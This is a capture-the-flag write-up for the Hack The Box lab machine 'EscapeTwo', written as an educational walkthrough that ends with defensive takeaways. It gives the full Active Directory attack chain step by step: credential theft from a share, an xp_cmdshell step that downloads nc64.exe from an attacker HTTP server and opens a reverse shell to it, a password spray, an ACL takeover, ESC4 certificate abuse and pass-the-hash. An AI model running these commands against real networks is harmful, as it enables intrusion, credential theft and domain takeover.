# HTB Write-Up: EscapeTwo

| Field      | Details                                                           |
|------------|-------------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/EscapeTwo)     |
| Difficulty | Easy                                                              |
| OS         | Windows (Active Directory)                                        |
| Author     | Landau                                                            |
| Date       | April 14, 2026                                                    |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration — SMB & Credential Discovery](#2-enumeration--smb--credential-discovery)
3. [Initial Access — MSSQL xp_cmdshell RCE](#3-initial-access--mssql-xp_cmdshell-rce)
4. [Lateral Movement — Password Spray & WinRM](#4-lateral-movement--password-spray--winrm)
5. [Privilege Escalation — WriteOwner Abuse & ESC4 ADCS Attack](#5-privilege-escalation--writeowner-abuse--esc4-adcs-attack)
6. [Summary](#6-summary)

---

## 1. Reconnaissance

Port scanning was performed with **RustScan** for rapid host discovery. The port profile immediately identifies this machine as a **Windows Domain Controller**.

```bash
rustscan -a 10.129.232.128 --ulimit 5000
```

**Key Open Ports:**

| Port  | Service         | Significance                                        |
|-------|-----------------|-----------------------------------------------------|
| 53    | DNS             | Confirms Domain Controller role                     |
| 88    | Kerberos        | Active Directory authentication                     |
| 139 / 445 | SMB         | File sharing — primary enumeration target           |
| 464   | Kpasswd         | Kerberos password change service                    |
| 636   | LDAPS           | Secure LDAP                                         |
| 1433  | MSSQL           | Microsoft SQL Server — high-value target            |
| 3268 / 3269 | Global Catalog | AD forest-wide LDAP queries                  |
| 5985  | WinRM           | Remote management — shell access if credentials obtained |

The presence of **port 1433 (MSSQL)** alongside a Domain Controller is a notable attack surface. The machine description provides a starting credential set: `rose / KxEPkKe6R8su`.

---

## 2. Enumeration — SMB & Credential Discovery

### 2.1 — SMB Share Enumeration

SMB shares were enumerated using **NetExec** with the provided credentials:

```bash
netexec smb 10.129.232.128 -u 'rose' -p 'KxEPkKe6R8su' --shares
```

The domain was identified as `sequel.htb` and the hostname as `DC01`. The following shares were accessible to `rose`:

| Share                  | Permissions | Notes                      |
|------------------------|-------------|----------------------------|
| Accounting Department  | READ        | Non-default — high interest |
| IPC$                   | READ        | Standard                   |
| NETLOGON               | READ        | Standard DC share           |
| SYSVOL                 | READ        | Standard DC share           |
| Users                  | READ        | User profile data           |

### 2.2 — Extracting Credentials from XLSX Files

The `Accounting Department` share contained two Excel files:

```bash
smbclient //10.129.232.128/'Accounting Department' -U 'rose%KxEPkKe6R8su'
# accounts.xlsx  accounting_2024.xlsx
```

Since `.xlsx` files are ZIP archives containing XML, they were extracted and inspected directly:

```bash
unzip accounts.xlsx -d accounts_extracted/
cat accounts_extracted/xl/sharedStrings.xml
```

The `sharedStrings.xml` file contained a plaintext user table including credentials for multiple domain accounts and the MSSQL `sa` account:

| Username | Password           |
|----------|--------------------|
| angela   | 0fwz7Q4mSpurIt99   |
| oscar    | 86LxLBMgEWaKUnBG   |
| kevin    | Md9Wlq1E5bZnVDVo   |
| sa       | MSSQLP@ssw0rd!     |

Storing credentials in unprotected spreadsheets on a network share is a critical security failure. The `sa` (System Administrator) account for MSSQL was the most immediately valuable finding.

---

## 3. Initial Access — MSSQL xp_cmdshell RCE

### 3.1 — Authenticating to MSSQL

The `sa` credentials were used to connect to the MSSQL instance via Impacket's `mssqlclient.py`:

```bash
python3 mssqlclient.py sequel.htb/'sa:MSSQLP@ssw0rd!'@sequel.htb
```

Connection was successful, landing in the `master` database context as the `sa` user — a database superadmin.

### 3.2 — Enabling xp_cmdshell

`xp_cmdshell` is a stored procedure that allows OS command execution from within MSSQL. It is disabled by default but can be enabled by a DBA-level user:

```sql
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
-- Output: sequel\sql_svc
```

The MSSQL service runs as domain user `sequel\sql_svc`, meaning OS commands execute under that account's context.

### 3.3 — Obtaining a Reverse Shell

`nc64.exe` was transferred to the target via `certutil`, and a reverse shell was established:

```sql
-- Step 1: Download nc64.exe from attacker's HTTP server
EXEC xp_cmdshell 'certutil -urlcache -split -f http://10.10.15.33/nc64.exe C:\Users\sql_svc\Desktop\nc64.exe';

-- Step 2: Execute reverse shell
EXEC xp_cmdshell 'C:\Users\sql_svc\Desktop\nc64.exe -e cmd.exe 10.10.15.33 1337';
```

```bash
# Attacker listener
rlwrap nc -nvlp 1337
```

**Result — Shell obtained as `sequel\sql_svc`:**

```
Microsoft Windows [Version 10.0.17763.6659]
C:\Windows\system32> whoami
sequel\sql_svc
```

### 3.4 — Credential Discovery in SQL Setup Files

Post-exploitation enumeration revealed a non-default directory `C:\SQL2019\ExpressAdv_ENU\`. Inside, the SQL Server installation configuration file contained hardcoded service account credentials:

```
C:\SQL2019\ExpressAdv_ENU> type sql-Configuration.INI

SQLSVCACCOUNT="SEQUEL\sql_svc"
SQLSVCPASSWORD="WqSZAF6CysDQbGb3"
SAPWD="MSSQLP@ssw0rd!"
```

The `sql_svc` service account password `WqSZAF6CysDQbGb3` was extracted for use in a password spray.

---

## 4. Lateral Movement — Password Spray & WinRM

### 4.1 — Enumerating Domain Users

A full domain user list was compiled using NetExec:

```bash
netexec smb 10.129.232.128 -u 'rose' -p 'KxEPkKe6R8su' --users
```

The extracted usernames were: `Administrator`, `Guest`, `krbtgt`, `michael`, `ryan`, `oscar`, `sql_svc`, `rose`.

### 4.2 — Password Spray with Service Account Password

The recovered SQL service account password was sprayed across all domain users:

```bash
netexec smb 10.129.232.128 -u users.txt -p 'WqSZAF6CysDQbGb3'
```

**Result:**

```
[-] sequel.htb\Administrator  STATUS_LOGON_FAILURE
[-] sequel.htb\michael         STATUS_LOGON_FAILURE
[+] sequel.htb\ryan:WqSZAF6CysDQbGb3
```

User `ryan` was found to be reusing the SQL service account password — a credential hygiene failure that enabled lateral movement.

### 4.3 — WinRM Access as `ryan`

Port 5985 (WinRM) was open, and `ryan`'s credentials were used to obtain an interactive shell:

```bash
evil-winrm -u ryan -p WqSZAF6CysDQbGb3 -i 10.129.232.128
```

**User flag retrieved** from `C:\Users\ryan\Desktop\user.txt`.

---

## 5. Privilege Escalation — WriteOwner Abuse & ESC4 ADCS Attack

### 5.1 — BloodHound Analysis: WriteOwner on ca_svc

BloodHound analysis of the domain revealed that `ryan` holds **WriteOwner** privileges over the `ca_svc` account — the Certificate Authority service account. This permission allows `ryan` to take ownership of the object and then grant himself full control, including the ability to reset `ca_svc`'s password.

### 5.2 — Abusing WriteOwner to Reset ca_svc's Password

Using **PowerView** loaded into the Evil-WinRM session:

```powershell
# Step 1: Take ownership of ca_svc
Set-DomainObjectOwner -Identity "ca_svc" -OwnerIdentity "ryan"

# Step 2: Grant ryan the ResetPassword right
Add-DomainObjectAcl -TargetIdentity "ca_svc" -Rights ResetPassword -PrincipalIdentity "ryan"

# Step 3: Reset the password
$cred = ConvertTo-SecureString "hacker123!!" -AsPlainText -Force
Set-DomainUserPassword -Identity "ca_svc" -AccountPassword $cred
```

The new credentials were verified:

```bash
netexec smb 10.129.232.128 -u 'ca_svc' -p 'hacker123!!'
# [+] sequel.htb\ca_svc:hacker123!!
```

### 5.3 — ADCS Enumeration with Certipy (ESC4)

With the `ca_svc` account now under control, **Certipy** was used to enumerate Active Directory Certificate Services (ADCS) for vulnerable certificate templates:

```bash
certipy find -u 'ca_svc@sequel.htb' -p 'hacker123!!' -dc-ip 10.129.232.128 -stdout
```

Among 34 templates discovered, the `DunderMifflinAuthentication` template was flagged as vulnerable:

```
Template Name         : DunderMifflinAuthentication
Client Authentication : True
Enabled               : True
[!] Vulnerabilities
  ESC4 : User has dangerous permissions.
```

**ESC4** occurs when an unprivileged user has write permissions over a certificate template. This allows the attacker to modify the template's properties — specifically enabling `ENROLLEE_SUPPLIES_SUBJECT` — and then request a certificate for any UPN, including `administrator@sequel.htb`.

### 5.4 — Requesting a Certificate as Administrator

Using the `ca_svc` account's write access over the template, a certificate was requested with the Administrator's UPN as the Subject Alternative Name (SAN):

```bash
certipy req -username ca_svc@sequel.htb -p 'hacker123!!' \
  -ca sequel-DC01-CA \
  -template DunderMifflinAuthentication \
  -target dc01.sequel.htb \
  -upn administrator@sequel.htb
```

```
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@sequel.htb'
[*] Saved certificate and private key to 'administrator.pfx'
```

### 5.5 — Extracting the Administrator NTLM Hash

The obtained certificate was used to authenticate via PKINIT and retrieve the Administrator's NT hash:

```bash
certipy auth -pfx administrator.pfx -domain sequel.htb
```

```
[*] Got TGT
[*] Got hash for 'administrator@sequel.htb':
aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8ed4060f75e5a0b3ff
```

### 5.6 — Pass-the-Hash to Administrator Shell

The NT hash was used directly with Evil-WinRM for a Pass-the-Hash authentication:

```bash
evil-winrm -u Administrator -H 7a8d4e04986afa8ed4060f75e5a0b3ff -i sequel.htb
```

**Result — Administrator shell obtained. Root flag retrieved.**

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> type ..\Desktop\root.txt
```

---

## 6. Summary

| Phase                    | Technique                                                      | Result                                  |
|--------------------------|----------------------------------------------------------------|-----------------------------------------|
| Recon                    | RustScan — full port scan                                      | DC identified; MSSQL on port 1433 noted |
| SMB Enumeration          | NetExec share enumeration as `rose`                            | `Accounting Department` share accessible|
| Credential Discovery     | XLSX XML extraction from SMB share                             | `sa` MSSQL credentials obtained         |
| Initial Access           | MSSQL `sa` → `xp_cmdshell` → reverse shell via `nc64.exe`     | Shell as `sequel\sql_svc`               |
| Credential Discovery #2  | SQL Server installation config file (`sql-Configuration.INI`)  | `sql_svc` service account password      |
| Lateral Movement         | Password spray → `ryan` reuses `sql_svc` password             | WinRM shell as `ryan`; user flag        |
| ACL Abuse                | WriteOwner on `ca_svc` → ownership takeover → password reset   | Control of `ca_svc`                     |
| ADCS Exploitation (ESC4) | Certipy — vulnerable template → cert request as Administrator  | `administrator.pfx` obtained            |
| Privilege Escalation     | PKINIT auth → NT hash extraction → Pass-the-Hash              | Administrator shell; root flag          |

### Key Takeaways

- **Sensitive credentials must never be stored in SMB-accessible files.** The `accounts.xlsx` file exposed domain account passwords and the MSSQL `sa` credential to any authenticated user — a single compromised low-privilege account was enough to retrieve them.
- **Service accounts should use unique, non-reused passwords.** The `sql_svc` password found in a configuration file was being reused by `ryan`, enabling straightforward lateral movement via a password spray.
- **Installation artifacts should be removed post-deployment.** The `sql-Configuration.INI` file containing plaintext passwords had no reason to remain on the production system after installation.
- **ADCS misconfigurations (ESC4) are a direct path to domain compromise.** Granting write permissions over certificate templates to non-administrative principals is effectively equivalent to granting them the ability to impersonate any domain user — including the Administrator.
- **WriteOwner ACL edges in Active Directory are high-severity findings.** Object ownership control enables a full ACL takeover chain with minimal tooling, as demonstrated through the `ryan` → `ca_svc` pivot.
